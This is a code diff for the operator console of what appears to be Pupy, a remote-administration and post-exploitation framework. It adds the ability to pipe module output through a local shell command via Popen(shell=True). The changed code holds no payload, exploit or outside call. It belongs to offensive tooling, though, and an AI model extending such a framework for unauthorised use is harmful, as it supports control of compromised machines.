@@ -28,7 +28,8 @@ import fcntl
 import array
 import readline
 
-from threading import Event, Lock
+from threading import Thread, Event, Lock
+from subprocess import Popen, PIPE, STDOUT
 
 from network.lib.base_launcher import LauncherError
 
@@ -54,13 +55,119 @@ from termios import TCSANOW
 from . import getLogger
 logger = getLogger('cmd')
 
-class IOGroup(object):
-    __slots__ = ('_stdin', '_stdout', '_logger')
 
-    def __init__(self, stdin, stdout, logger=None):
+class ObjectStreamPipeConsumer(Thread):
+    __slots__ = (
+        'pipe', '_write', '_nocrlf',
+        '_write_lock', '_read_lock'
+    )
+
+    def __init__(self, pipe, write, nocrlf):
+        self.pipe = Popen(
+            pipe, shell=True,
+            stdin=PIPE, stdout=PIPE, stderr=STDOUT
+        )
+        self._write = write
+        self._nocrlf = nocrlf
+        self._write_lock = Lock()
+        self._read_lock = Lock()
+
+        super(ObjectStreamPipeConsumer, self).__init__()
+        self.daemon = True
+
+    def write(self, object):
+        text = hint_to_text(object)
+        if not self._nocrlf:
+            text += '\n'
+
+        with self._write_lock:
+            self.pipe.stdin.write(text)
+
+    def close(self):
+        with self._write_lock:
+            self.pipe.stdin.close()
+
+        with self._read_lock:
+            self.pipe.wait()
+
+    def run(self):
+        while True:
+            with self._read_lock:
+                chunk = self.pipe.stdout.read()
+
+            if not chunk:
+                break
+
+            self._write(chunk)
+
+
+class ObjectStream(object):
+    __slots__ = ('_buffer', '_display', '_stream', '_pipe', '_pipe_cmd')
+
+    def __init__(self, display=None, stream=False, pipe=None):
+        self._buffer = []
+        self._display = display
+        self._stream = stream
+        self._pipe_cmd = pipe
+        self._pipe = None
+
+    def write(self, data):
+        if self._pipe_cmd:
+            if self._pipe is None:
+                self._pipe = ObjectStreamPipeConsumer(
+                    self._pipe_cmd,
+                    self._display if self._display else self._buffer.append,
+                    self._stream
+                )
+                self._pipe.start()
+
+            self._pipe.write(data)
+
+        elif self._display:
+            self._display(data, nocrlf=self._stream)
+        else:
+            self._buffer.append(data)
+
+    def close(self):
+        if self._pipe:
+            self._pipe.close()
+            self._pipe.join()
+            self._pipe = None
+
+    def flush(self):
+        pass
+
+    def getvalue(self):
+        self.close()
+
+        blocks = self._buffer
+        self._buffer = []
+        return blocks
+
+    @property
+    def is_stream(self):
+        return self._stream
+
+    def __nonzero__(self):
+        return bool(self._buffer)
+
+
+class IOGroup(object):
+    __slots__ = ('_stdin', '_stdout', '_logger', '_pipe')
+
+    def __init__(self, stdin, stdout, logger=None, pipe=None):
         self._stdin = stdin
         self._stdout = stdout
         self._logger = logger
+        self._pipe = None
+
+        if pipe:
+            self._pipe = Popen(
+                pipe, shell=True,
+                stdout=stdout, stdin=PIPE, stderr=STDOUT
+            )
+
+            self._stdout = self._pipe.stdin
 
     @property
     def stdin(self):
@@ -83,7 +190,11 @@ class IOGroup(object):
         return hint_to_text(msg)
 
     def close(self):
-        pass
+        if self._pipe:
+            self._pipe.communicate()
+
+        if isinstance(self._stdout, ObjectStream):
+            self._stdout.close()
 
     @property
     def consize(self):
@@ -280,38 +391,6 @@ class RawTerminal(IOGroup):
         return not self._active
 
 
-class ObjectStream(object):
-    __slots__ = ('_buffer', '_display', '_stream')
-
-    def __init__(self, display=None, stream=False):
-        self._buffer = []
-        self._display = display
-        self._stream = stream
-
-    def write(self, data):
-        if self._display:
-            self._display(data, nocrlf=self._stream)
-        else:
-            self._buffer.append(data)
-
-    def close(self):
-        pass
-
-    def flush(self):
-        pass
-
-    def getvalue(self):
-        blocks = self._buffer
-        self._buffer = []
-        return blocks
-
-    @property
-    def is_stream(self):
-        return self._stream
-
-    def __nonzero__(self):
-        return bool(self._buffer)
-
 class PupyCmd(cmd.Cmd):
     def __init__(self, pupsrv):
         cmd.Cmd.__init__(self)
@@ -478,13 +557,16 @@ class PupyCmd(cmd.Cmd):
         except PupyModuleExit:
             pass
 
-    def acquire_io(self, requirements, amount, background=False):
+    def acquire_io(self, requirements, amount, background=False, pipe=None):
 
         stream = requirements != REQUIRE_NOTHING
 
         if requirements in (REQUIRE_REPL, REQUIRE_TERMINAL):
             if amount > 1:
                 raise NotImplementedError('This UI does not support more than 1 repl or terminal')
+
+            if pipe:
+                raise NotImplementedError('This UI does not support pipelining of repl or terminal')
 
             if requirements == REQUIRE_TERMINAL:
                 stdout2 = os.dup(self.stdout.fileno())
@@ -495,12 +577,20 @@ class PupyCmd(cmd.Cmd):
                         self.config.getboolean('cmdline', 'shadow_screen')
                 )]
             else:
-                return [IOGroup(self.stdin, self.stdout)]
+                return [
+                    IOGroup(self.stdin, self.stdout, pipe=pipe)
+                ]
 
         elif amount == 1 and not background:
-            return [IOGroup(None, ObjectStream(self.display, stream))]
+            return [
+                IOGroup(None, ObjectStream(self.display, stream, pipe=pipe))
+            ]
         else:
-            return [IOGroup(None, ObjectStream(stream=stream)) for _ in xrange(amount)]
+            return [
+                IOGroup(
+                    None, ObjectStream(stream=stream, pipe=pipe)
+                ) for _ in xrange(amount)
+            ]
 
     def process(self, job, background=False, daemon=False, unique=False):
         if background or daemon:
@@ -532,11 +622,12 @@ class PupyCmd(cmd.Cmd):
             if idx < modules-1:
                 self.display(NewLine(0))
 
-    def display(self, text, nocrlf=False):
+    def display(self, text, nocrlf=False, to_bytes=False):
         with self.display_lock:
             text = hint_to_text(text)
             if not nocrlf:
                 text += '\n'
+
             return self.stdout.write(text)
 
     def redraw_line(self, msg=''):
